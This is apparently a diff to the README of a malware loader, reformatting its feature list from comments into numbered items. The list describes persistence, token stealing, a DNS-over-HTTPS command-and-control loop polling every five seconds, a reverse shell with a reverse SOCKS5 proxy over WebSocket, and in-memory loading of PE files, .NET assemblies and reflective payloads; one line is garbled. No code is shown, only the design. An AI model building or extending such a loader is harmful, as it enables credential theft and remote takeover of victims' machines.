@@ -54,12 +54,12 @@ npm install # dependencies
 npm start # start
 
 **Loader works**: 
-# Save check
-# Persistence
-# Makes token stealth(how to where for what, yeah, think while it takes everything and uses the first one it finds)
-# Opening session and a single A signal to mark online status
-# Background C2 loop sends a DoH request to the domain every 5 seconds and receives the result.
-# Supports commands:
+1. Save check
+2. Persistence
+3. Makes token stealth(how to where for what, yeah, think while it takes everything and uses the first one it finds)
+4. Opening session and a single A signal to mark online status
+5. Background C2 loop sends a DoH request to the domain every 5 seconds and receives the result.
+6. Supports commands:
 - start_proxy - Starts a reverse shell server on RSHELL_PORT and a reverse SOCKS5 client via WebSocket transport at the same time.
 - stop_proxy - Stops the proxy and shell. 
 - list_dir - Bypasses printing each file/directory.
@@ -70,8 +70,8 @@ npm start # start
 - load_pe - Decodes a PE image (dll/exe) and loads it (MemoryModule + DllMain).
 - load_dotnet - Decodes a .net assembly and loads it via CLR v4+ API.
 - exec_reflective - Decodes either the PE or reflective shell, and executes it.
-# Reverse shell + SOCKS5 starts immediately at the entry point
-# Stop completes all modules and exits
+7. Reverse shell + SOCKS5 starts immediately at the entry point
+8. Stop completes all modules and exits
 
 Edits:
 - Debug the build through py builder
